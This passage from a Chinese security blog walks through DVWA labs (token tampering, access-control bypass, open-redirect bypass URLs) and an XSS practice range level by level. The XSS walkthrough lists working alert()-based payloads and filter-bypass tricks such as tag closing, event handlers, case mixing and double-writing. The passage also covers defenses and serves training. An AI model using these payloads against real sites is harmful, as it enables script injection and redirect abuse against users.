<p>然后在 token_part_1 下断点：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405230951593.png" alt="image-20240523095103539"></p>
<p><code>do_something(e)</code> 函数接收一个字符串 <code>e</code> 作为参数，并返回这个字符串的逆序</p>
<p><code>token_part_1(a, b)</code> 函数调用 <code>do_something()</code> 函数，并设置 <code>id</code> 为 “token” 的 HTML 元素的 <code>value</code> 为 <code>phrase</code> 元素的值的逆序</p>
<p><code>token_part_2(e = &quot;YY&quot;)</code> 函数使用默认参数 “YY”，将其与 “token” 元素的当前值连接，并使用 SHA-256 算法进行哈希</p>
<p><code>token_part_3(t, y = &quot;ZZ&quot;)</code> 函数类似于 <code>token_part_2</code>，但它允许通过按钮点击事件触发，并将 “token” 元素的值与 “ZZ” 进行连接后进行哈希</p>
<p>关键还是这个phrase，在控制台上修改它的值</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.getElementById(&quot;phrase&quot;).value=&quot;success&quot;;</span><br></pre></td></tr></table></div></figure>

<p>再点击提交即可成功</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405230948877.png" alt="image-20240523094848838"></p>
<p>源代码主要也是这个js文件</p>

        <h2 id="Impossible-13"   >
          <a href="#Impossible-13" class="heading-link"><i class="fas fa-link"></i></a><a href="#Impossible-13" class="headerlink" title="Impossible"></a>Impossible</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405230956126.png" alt="image-20240523095638089"></p>
<p>直接让其没有输入了</p>

        <h1 id="十五、越权"   >
          <a href="#十五、越权" class="heading-link"><i class="fas fa-link"></i></a><a href="#十五、越权" class="headerlink" title="十五、越权"></a>十五、越权</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231005923.png" alt="image-20240523100542855"></p>
<p>由于现在我登录的是admin管理员账号，所以能对这些用户进行操作</p>
<p>但当我登录gordonb账号时就没有这个页面了</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231007763.png" alt="image-20240523100727722"></p>

        <h2 id="Low-14"   >
          <a href="#Low-14" class="heading-link"><i class="fas fa-link"></i></a><a href="#Low-14" class="headerlink" title="Low"></a>Low</h2>
      <p>登录gordonb账号时，当我把之前登录管理员账号时的网页复制粘贴，就能看到现在是gordonb拥有操作权限</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231009624.png" alt="image-20240523100933570"></p>

        <h2 id="Medium、High、Impossible"   >
          <a href="#Medium、High、Impossible" class="heading-link"><i class="fas fa-link"></i></a><a href="#Medium、High、Impossible" class="headerlink" title="Medium、High、Impossible"></a>Medium、High、Impossible</h2>
      <p>按同样的操作粘贴后却显示未授权</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231011368.png" alt="image-20240523101144332"></p>
<p>查看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231013397.png" alt="image-20240523101308357"></p>
<p>都设置了只有当前用户是admin时才能进行访问</p>

        <h1 id="十六、重定向"   >
          <a href="#十六、重定向" class="heading-link"><i class="fas fa-link"></i></a><a href="#十六、重定向" class="headerlink" title="十六、重定向"></a>十六、重定向</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231026658.png" alt="image-20240523102612620"></p>

        <h2 id="Low-15"   >
          <a href="#Low-15" class="heading-link"><i class="fas fa-link"></i></a><a href="#Low-15" class="headerlink" title="Low"></a>Low</h2>
      <p>查看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231026879.png" alt="image-20240523102642842"></p>
<p>这段代码检查 URL 参数 <code>redirect</code> 是否存在且不为空，如果满足条件，则通过 <code>header</code> 函数发送一个 HTTP 重定向到该参数指定的 URL</p>
<p>没有任何过滤，可以直接传参一个网页给redirect</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:4280/vulnerabilities/open_redirect/source/low.php?redirect=https://www.baidu.com/</span><br></pre></td></tr></table></div></figure>

<p>直接就跳转到百度了</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231028188.png" alt="image-20240523102803107"></p>

        <h2 id="Medium-14"   >
          <a href="#Medium-14" class="heading-link"><i class="fas fa-link"></i></a><a href="#Medium-14" class="headerlink" title="Medium"></a>Medium</h2>
      <p>查看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231028988.png" alt="image-20240523102855951"></p>
<p>过滤了http://和https://</p>
<p>使用代理页面：创建一个中间代理页面，用户访问该页面时，该页面再将请求重定向到百度。</p>
<p>创建一个名为 redirect.php 的 PHP 文件。<br>在 redirect.php 文件中添加以下代码：<br><?php
header("Location: http://www.baidu.com");
exit;
?></p>
<p>上传 redirect.php 文件到服务器上，确保它可以被公开访问（例如放置在公共的网站根目录）。</p>
<p>当用户访问 redirect.php 页面时，会被自动重定向到百度的绝对 URL。</p>

        <h2 id="High-14"   >
          <a href="#High-14" class="heading-link"><i class="fas fa-link"></i></a><a href="#High-14" class="headerlink" title="High"></a>High</h2>
      <p>查看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231051923.png" alt="image-20240523105101881"></p>
<p>检查 <code>redirect</code> 参数中是否包含 “info.php” 字符串</p>
<p>可以让任意一个参数的值设置为info.php</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:4280/vulnerabilities/open_redirect/source/low.php?redirect=https://www.baidu.com/?a=info.php</span><br></pre></td></tr></table></div></figure>

<p>重定向到了百度</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231055647.png" alt="image-20240523105532585"></p>

        <h2 id="Impossible-14"   >
          <a href="#Impossible-14" class="heading-link"><i class="fas fa-link"></i></a><a href="#Impossible-14" class="headerlink" title="Impossible"></a>Impossible</h2>
      <p>查看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231057619.png" alt="image-20240523105737570"></p>
<p>首先检查 <code>redirect</code> 是否存在于 GET 请求中，并且确认它的值是数字</p>
<p><code>intval</code> 函数用于确保 <code>redirect</code> 参数被当作整数处理</p>
<p><code>switch</code> 语句根据 <code>redirect</code> 的整数值选择不同的目标 URL</p>
<p>参考：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/05/dvwa.html#Low-2" >https://www.sqlsec.com/2020/05/dvwa.html#Low-2</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/10/14/XSS%E6%94%BB%E5%87%BB/">XSS攻击</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2023-10-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2024-06-04</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="XSS攻击"   >
          <a href="#XSS攻击" class="heading-link"><i class="fas fa-link"></i></a><a href="#XSS攻击" class="headerlink" title="XSS攻击"></a>XSS攻击</h1>
      
        <h6 id="实践网站：https-xssaq-com-yx"   >
          <a href="#实践网站：https-xssaq-com-yx" class="heading-link"><i class="fas fa-link"></i></a><a href="#实践网站：https-xssaq-com-yx" class="headerlink" title="实践网站：https://xssaq.com/yx/"></a>实践网站：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://xssaq.com/yx/" >https://xssaq.com/yx/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></h6>
      <p>跨站脚本攻击 XSS（Cross Site Scripting Scripting），指攻击者通过在web 页面中写入恶意脚本，进而在用户浏览页面时，控制用户浏览器进行操作的攻击方式。假设在一个服务器上，有一处功能使用了这段代码，他的功能是将用户输入的内容输出到页面上，这就是常见的表现。</p>

        <h4 id="反射型XSS"   >
          <a href="#反射型XSS" class="heading-link"><i class="fas fa-link"></i></a><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h4>
      <p>攻击者通过电子邮件等方式将包含xss代码的恶意链接发送给目标用户。当目标用户访问该链接时，服务器接收该目标用户的请求并进行处理，然后服务器把带有xss代码的数据发送给目标用户的浏览器，浏览器解析这段带有xss代码的恶意脚本后，就会触发xss漏洞。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309241444144.png" alt="image-20230924144421029"></p>

        <h4 id="存储型XSS"   >
          <a href="#存储型XSS" class="heading-link"><i class="fas fa-link"></i></a><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h4>
      <p>攻击者在发帖的过程中，将恶意脚本连同正常信息一起注入帖子的内容中。随着帖子被服务器存储下来，恶意脚本也永久地被存放在服务器的后端存储器中 。 当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本会在他们的浏览器中得到执行 。所以需要浏览器从服务器载入恶意的xss代码，才能真正触发xss。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309241445548.png" alt="image-20230924144550500"></p>

        <h4 id="DOM型XSS"   >
          <a href="#DOM型XSS" class="heading-link"><i class="fas fa-link"></i></a><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h4>
      <p>用户请求一个经过专门设计的URL，它由攻击者提交，而且其中包含XSS代码。服务器的响应不会以任何形式包含攻击者的脚本。 当用户的浏览器处理这个响应时， DOM对象就会处理XSS代码，导致存在XSS漏洞 。</p>

        <h2 id="测试方法"   >
          <a href="#测试方法" class="heading-link"><i class="fas fa-link"></i></a><a href="#测试方法" class="headerlink" title="测试方法"></a>测试方法</h2>
      <p>POC</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt; //弹框，最常用</span><br><span class="line">&lt;script&gt;confirm(&#x27;xss&#x27;)&lt;/script&gt; //弹出确认框</span><br><span class="line">&lt;script&gt;prompt(&#x27;xss&#x27;)&lt;/script&gt; //弹出输入框</span><br></pre></td></tr></table></div></figure>

<p>其他标签如：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt; img src =x onerror =&quot;alert(111)&quot;/&gt;</span><br></pre></td></tr></table></div></figure>

<p>特殊标签 </p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onclick=&#x27;alert(111)&#x27;</span><br><span class="line">javascript:alert(111)</span><br></pre></td></tr></table></div></figure>




        <h2 id="绕过"   >
          <a href="#绕过" class="heading-link"><i class="fas fa-link"></i></a><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2>
      
        <h4 id="①编码绕过"   >
          <a href="#①编码绕过" class="heading-link"><i class="fas fa-link"></i></a><a href="#①编码绕过" class="headerlink" title="①编码绕过"></a>①编码绕过</h4>
      
        <h5 id="js编码"   >
          <a href="#js编码" class="heading-link"><i class="fas fa-link"></i></a><a href="#js编码" class="headerlink" title="js编码"></a>js编码</h5>
      
        <h5 id="html实体编码"   >
          <a href="#html实体编码" class="heading-link"><i class="fas fa-link"></i></a><a href="#html实体编码" class="headerlink" title="html实体编码"></a>html实体编码</h5>
      
        <h5 id="url编码"   >
          <a href="#url编码" class="heading-link"><i class="fas fa-link"></i></a><a href="#url编码" class="headerlink" title="url编码"></a>url编码</h5>
      
        <h5 id="ascii编码"   >
          <a href="#ascii编码" class="heading-link"><i class="fas fa-link"></i></a><a href="#ascii编码" class="headerlink" title="ascii编码"></a>ascii编码</h5>
      
        <h5 id="base64编码"   >
          <a href="#base64编码" class="heading-link"><i class="fas fa-link"></i></a><a href="#base64编码" class="headerlink" title="base64编码"></a>base64编码</h5>
      
        <h5 id="Hex编码"   >
          <a href="#Hex编码" class="heading-link"><i class="fas fa-link"></i></a><a href="#Hex编码" class="headerlink" title="Hex编码"></a>Hex编码</h5>
      
        <h4 id="②其他方式"   >
          <a href="#②其他方式" class="heading-link"><i class="fas fa-link"></i></a><a href="#②其他方式" class="headerlink" title="②其他方式"></a>②其他方式</h4>
      
        <h5 id="过滤空格"   >
          <a href="#过滤空格" class="heading-link"><i class="fas fa-link"></i></a><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h5>
      <p>斜杠代替空格</p>

        <h5 id="过滤单引号、双引号"   >
          <a href="#过滤单引号、双引号" class="heading-link"><i class="fas fa-link"></i></a><a href="#过滤单引号、双引号" class="headerlink" title="过滤单引号、双引号"></a>过滤单引号、双引号</h5>
      <p>可以使用反单引号代替单引号和双引号</p>

        <h5 id="过滤函数"   >
          <a href="#过滤函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#过滤函数" class="headerlink" title="过滤函数"></a>过滤函数</h5>
      <p>可以使用到其他的方法进行javascript远程加载</p>

        <h5 id="过滤括号"   >
          <a href="#过滤括号" class="heading-link"><i class="fas fa-link"></i></a><a href="#过滤括号" class="headerlink" title="过滤括号"></a>过滤括号</h5>
      <p>使用throw 过滤</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;onerror alert;throw 1&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>


        <h2 id="防御"   >
          <a href="#防御" class="heading-link"><i class="fas fa-link"></i></a><a href="#防御" class="headerlink" title="防御"></a>防御</h2>
      
        <h4 id="过滤"   >
          <a href="#过滤" class="heading-link"><i class="fas fa-link"></i></a><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h4>
      <p>过滤输入的字符，以及非法字符例如：&lt; 、&gt; 、* 、”、‘等对输入到页面上的数据进行相应的编码转换，包括html 实体编码，javascript 编码等</p>

        <h4 id="httponly"   >
          <a href="#httponly" class="heading-link"><i class="fas fa-link"></i></a><a href="#httponly" class="headerlink" title="httponly"></a>httponly</h4>
      <p>对cookie 启用httponly</p>

        <h4 id="CSP"   >
          <a href="#CSP" class="heading-link"><i class="fas fa-link"></i></a><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h4>
      <p>启用csp 后，不符合的外部资源就会被禁止加载</p>

        <h4 id="PHP实体化"   >
          <a href="#PHP实体化" class="heading-link"><i class="fas fa-link"></i></a><a href="#PHP实体化" class="headerlink" title="PHP实体化"></a>PHP实体化</h4>
      <p>html specialchars方法可以编码双引号的单引号</p>

        <h1 id="level-1"   >
          <a href="#level-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#level-1" class="headerlink" title="level-1"></a>level-1</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309241452155.png" alt="image-20230924145239094"></p>
<p>URL有输入，我们更改一下name</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xssaq.com/yx/level1.php?name=admin</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309241453580.png" alt="image-20230924145323522"></p>
<p>发现界面有变化</p>
<p>尝试构造脚本，将</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>

<p>传入name变量</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309241454337.png" alt="image-20230924145448291"></p>

        <h1 id="level-2"   >
          <a href="#level-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#level-2" class="headerlink" title="level-2"></a>level-2</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309241456802.png" alt="image-20230924145634756"></p>
<p>将</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>

<p>传入keyword变量</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309241457807.png" alt="image-20230924145703759"></p>
<p>界面有变化，但是没成功，查看网页源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309241458877.png"></p>
<p>可以看到&lt;&gt;更改了，但是插入到value参数中的代码并没有更改而是直接返回</p>
<p>上网搜索后发现是“看到</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>

<p>被嵌套到value属性中，所以我们需要闭合input标签。”</p>

        <h6 id="用例子解释一下这个闭合"   >
          <a href="#用例子解释一下这个闭合" class="heading-link"><i class="fas fa-link"></i></a><a href="#用例子解释一下这个闭合" class="headerlink" title="用例子解释一下这个闭合"></a>用例子解释一下这个闭合</h6>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309241720254.png" alt="image-20230924172010225"></p>
<p>所以构建payload</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309241711195.png" alt="image-20230924171159157"></p>

        <h1 id="level-3"   >
          <a href="#level-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#level-3" class="headerlink" title="level-3"></a>level-3</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309241725069.png" alt="image-20230924172506020"></p>
<p>试着在框里输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309241725435.png" alt="image-20230924172553382"></p>
<p>查看网页源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309241728449.png" alt="image-20230924172816412"></p>
<p>发现value中原本输入的字符&lt;&gt;变化了，那就说明value属性过滤了</p>
<p>构造一个事件，使得事件发生时，则执行JavaScript</p>
<p>在框内输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onclick=&#x27;alert(1)&#x27;</span><br></pre></td></tr></table></div></figure>

<p>成功通关！</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310141552287.png" alt="image-20231014155217175"></p>

        <h1 id="level-4"   >
          <a href="#level-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#level-4" class="headerlink" title="level-4"></a>level-4</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310141554297.png" alt="image-20231014155402215"></p>
<p>将</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>

<p>传入keyword变量</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310141554749.png" alt="image-20231014155432655"></p>
<p>查看网页源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310141555553.png" alt="image-20231014155525491"></p>
<p>发现&lt;&gt;都被过滤掉了，也可以构造一个事件进行绕过，用双引号进行属性闭合</p>
<p>传入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">“ onclick=”alert(1)</span><br></pre></td></tr></table></div></figure>

<p>再点击输入框则成功通关</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310141652076.png" alt="image-20231014165220004"></p>

        <h1 id="level-5"   >
          <a href="#level-5" class="heading-link"><i class="fas fa-link"></i></a><a href="#level-5" class="headerlink" title="level-5"></a>level-5</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310141652923.png" alt="image-20231014165239818"></p>
<p>老样子，传入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310141657152.png" alt="image-20231014165700072"></p>
<p>查看网页源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310141657381.png" alt="image-20231014165740322"></p>
<p>发现中间多了“_”，用点击事件试一下，传入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">“ onclick=”alert(1)</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310141658993.png" alt="image-20231014165842861"></p>
<p>o和n中间还是多了”_”，可能是对on进行了过滤</p>
<p>尝试混合大小写字符，传入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">“ Onclick=”alert(1)</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310141702762.png" alt="image-20231014170230684"></p>
<p>还是不行，只能换一个标签来执行代码，仍然要闭合<input>标签，传入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a href=javascript:alert(1)&gt;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310141730010.png" alt="image-20231014173027877"></p>
<p>点击输入框右边的”&gt;，即可通关成功</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310141731029.png" alt="image-20231014173100915"></p>

        <h1 id="level-6"   >
          <a href="#level-6" class="heading-link"><i class="fas fa-link"></i></a><a href="#level-6" class="headerlink" title="level-6"></a>level-6</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310141731309.png" alt="image-20231014173158226"></p>
<p>传入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310141732436.png" alt="image-20231014173253381"></p>
<p>还是过滤，尝试大小写混写过滤，同时双引号闭合，传入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;ScRipt&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>

<p>成功通关</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310141734229.png" alt="image-20231014173453147"></p>

        <h1 id="level-7"   >
          <a href="#level-7" class="heading-link"><i class="fas fa-link"></i></a><a href="#level-7" class="headerlink" title="level-7"></a>level-7</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310141735345.png" alt="image-20231014173528269"></p>
<p>传入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>

<p>后查看网页源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310141736093.png" alt="image-20231014173603047"></p>
<p>发现script直接被过滤掉了，再尝试</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">“ onclick=”alert(1)</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310141737497.png" alt="image-20231014173731453"></p>
<p>onclick也被过滤掉，接着尝试</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a href=javascript:alert(1)&gt;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310151007084.png" alt="image-20231015100745979"></p>
<p>herf也被过滤了</p>
<p>按上一关的方法尝试大小写绕过</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310151013481.png" alt="image-20231015101307443"></p>
<p>还是不行，再试试双写绕过</p>
<p>传入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;scriscriptpt&gt;alert(/xss/)&lt;/scriscriptpt&gt;</span><br></pre></td></tr></table></div></figure>

<p>成功通关</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310151016608.png" alt="image-20231015101626568"></p>

        <h1 id="level-8"   >
          <a href="#level-8" class="heading-link"><i class="fas fa-link"></i></a><a href="#level-8" class="headerlink" title="level-8"></a>level-8</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310151016994.png" alt="image-20231015101640948"></p>
<p>注入<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310151019487.png" alt="image-20231015101941450"></p>
<p>value中的&lt;&gt;被转义，并且输入的内容插入了a标签的href中，其中的script也被转义成scr_ipt，所以不能使用带&lt;&gt;的内容，而且不是被过滤成空字符，也就不能使用双写绕过</p>
<p>尝试事件绕过，传入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">“ onclick=”alert(1)</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310151031248.png" alt="image-20231015103128218"></p>
<p>”也被转转义，href中的onclick也被转义成o_nclick</p>
<p>我们在输入框输入的内容，会被带入到友情链接href属性中，试一下javascript伪协议，尝试传入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(1)</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310151103100.png" alt="image-20231015110343069"></p>
<p>javascript被转义成javascr_ipt，只能试试编码绕过了，进行HTML实体编码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310151121906.png" alt="image-20231015112111841"></p>
<p>在框内输入</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310171536689.png" alt="image-20231017153651540"></p>
<p>再点击友情链接，成功通关！</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310171537796.png" alt="image-20231017153757748"></p>

        <h1 id="level-9"   >
          <a href="#level-9" class="heading-link"><i class="fas fa-link"></i></a><a href="#level-9" class="headerlink" title="level-9"></a>level-9</h1>
      <p><img src="../AppData/Roaming/Typora/typora-user-images/image-20231017154620127.png" alt="image-20231017154620127"></p>
<p>正常注入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310171603427.png" alt="image-20231017160307394"></p>
<p>和上题一样的有转义，有链接，但这个显示链接不合法，查看后台源码看看怎么回事</p>
<p>（一般像这种有靶场的，可以在google上搜索该网站，到github上获得开源的）</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310181439814.png" alt="image-20231018143942700"></p>

        <h6 id="strpos-函数返回字符串在另一个字符串中第一次出现的位置。如果没有找到该字符串，则返回-false。"   >
          <a href="#strpos-函数返回字符串在另一个字符串中第一次出现的位置。如果没有找到该字符串，则返回-false。" class="heading-link"><i class="fas fa-link"></i></a><a href="#strpos-函数返回字符串在另一个字符串中第一次出现的位置。如果没有找到该字符串，则返回-false。" class="headerlink" title="strpos() 函数返回字符串在另一个字符串中第一次出现的位置。如果没有找到该字符串，则返回 false。"></a>strpos() <em>函数</em>返回字符串在另一个字符串中第一次出现的位置。如果没有找到该字符串，则返回 false。</h6>
      <p>就是说输入的字符串内必须要有http://字符，于是尝试注入</p>
<p> (javascript伪协议还是用html实体编码)</p>
